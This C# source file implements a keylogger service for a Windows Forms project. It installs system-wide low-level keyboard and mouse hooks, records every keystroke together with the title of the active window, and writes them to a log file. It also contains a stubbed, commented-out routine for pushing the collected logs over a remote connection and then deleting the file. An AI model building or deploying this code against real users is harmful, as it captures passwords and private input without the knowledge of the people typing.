using System;
using System.IO;
using System.Windows.Forms;
using KeyBoardHook.Common.Native;
using KeyBoardHook.ExternalWindow;
using KeyBoardHook.KeyLogger.Entity;
using KeyBoardHook.KeyLogger.Enums;
using KeyBoardHook.KeyLogger.Hooker;
using Keys = System.Windows.Forms.Keys;

namespace KeyBoardHook.KeyLogger.Service
{
    public class KeyLoggerService
    {
        private const int MaxLogSize = 153600; //150 KiB

        private ActiveWindowHook _activeWindowHook;
        private KeyboardHook _keyboardHook;
        private MouseHookService mouseHookService ;

        private KeyLog _keyLog;
        private readonly FileInfo _logFile;

        private TextBox TextBox;
        private TextBox TextBox2;
        private ComboBox comboBox;

        public KeyLoggerService(TextBox TextBox,TextBox TextBox2,ComboBox comboBox)
        {
            this.TextBox = TextBox;
            this.TextBox2 = TextBox2;
            this.comboBox = comboBox;

            _logFile = new FileInfo("./_logFile.txt");
            
            _keyLog = KeyLog.Create(_logFile.FullName);
            _keyLog.Saved += _keyLog_Saved;
            
            _keyboardHook = new KeyboardHook(this.comboBox);
            _keyboardHook.keyEventHandler += _keyEventHandler;
            
            
            _activeWindowHook = new ActiveWindowHook();
            _activeWindowHook.ActiveWindowChanged += _activeWindowHook_ActiveWindowChanged;

            mouseHookService = new MouseHookService();
            mouseHookService.MouseMoveEvent += mh_MouseMoveEvent;
        }

        private void _keyEventHandler(object sender, KeyEventArgs e)
        {
            TextBox.Text += Chr(e.KeyValue);
        }

        public static string Chr(int asciiCode)
        {
            if (asciiCode >= 0 && asciiCode <= 255)
            {
                System.Text.ASCIIEncoding asciiEncoding = new System.Text.ASCIIEncoding();
                byte[] byteArray = new byte[] { (byte)asciiCode };
                string strCharacter = asciiEncoding.GetString(byteArray);
                return (strCharacter);
            }
            else
            {
                throw new Exception("ASCII Code is not valid.");
            }
        }

        public void Stop()
        {
            _keyLog.Save();
            _activeWindowHook.UnHook();
            _keyboardHook.UnHook();
            mouseHookService.UnHook();
        }

        public void Start(string type,string className ,string title)
        {
            
            
            IntPtr threadId = IntPtr.Zero;
            switch (type)
            {
                case "当前进程钩子":
                    threadId = NativeMethods.GetCurrentThreadId();
                    _keyboardHook.Hook(HookType.WH_KEYBOARD,IntPtr.Zero, threadId);
                    mouseHookService.Hook(HookType.WH_MOUSE,IntPtr.Zero, threadId);
                    _activeWindowHook.Hook(threadId);
                    break;
                case "全局钩子":
                    threadId = IntPtr.Zero;
                    var moduleHandle = NativeMethods.GetModuleHandle(System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName);
                    _keyboardHook.Hook(HookType.WH_KEYBOARD_LL,moduleHandle, threadId);
                    mouseHookService.Hook(HookType.WH_MOUSE_LL,moduleHandle, threadId);
                    _activeWindowHook.Hook(threadId);
                    break;
                case "指定窗口进程钩子":
                    threadId = IntPtr.Zero;
                    break;
              
            }

          
        }

        public bool TryPushKeyLog()
        {
            if (_logFile.Exists && _logFile.Length > 0)
            {
                _keyLog.Save();
                PushKeyLog(true);
                return true;
            }

            return false;
        }
     
        private void mh_MouseMoveEvent(object sender, MouseEventArgs e)
        {
            TextBox2.Text=("[btn:"+ e.Button + ":" + e.Clicks  +"   |" + e.X+ ":" + e.Y + "]");
            // Console.WriteLine("Move：[" + e.X+ ":" + e.Y + "]");
        }

        private void _keyLog_Saved(object sender, EventArgs e)
        {
            CheckSize();
        }

        private void _activeWindowHook_ActiveWindowChanged(object sender, ActiveWindowChangedEventArgs e)
        {
            TextBox.Text+=("\r\n======== 窗口 : [" + e.Title + "]========\r\n");
            _keyLog.WindowChanged(e.Title);
        }
 


        private void CheckSize()
        {
            _logFile.Refresh();
            if (!_logFile.Exists)
                return;

            if (_logFile.Length > MaxLogSize)
                PushKeyLog(false);
        }

        private void PushKeyLog(bool forcePush)
        {
            var tempLog = KeyLog.Parse(_logFile.FullName);
            try
            {
                // FIXME
                // _databaseConnection.PushFile(serializer.Serialize(tempLog.LogEntries), forcePush ? "Requested Key Log" : "Automatic Key Log", DataMode.KeyLog);
                _logFile.Delete();
            }
            catch (Exception)
            {
                // ignored
            }
        }

        public static SpecialKeyType KeysToSpecialKey(Keys key)
        {
            switch (key)
            {
                case Keys.Enter:
                    return SpecialKeyType.Return;
                case Keys.Shift:
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                    return SpecialKeyType.Shift;
                case Keys.LWin:
                case Keys.RWin:
                    return SpecialKeyType.Win;
                case Keys.Tab:
                    return SpecialKeyType.Tab;
                case Keys.Capital:
                    return SpecialKeyType.Captial;
                case Keys.Back:
                    return SpecialKeyType.Back;
                default:
                    return 0;
            }
        }

        
    }
}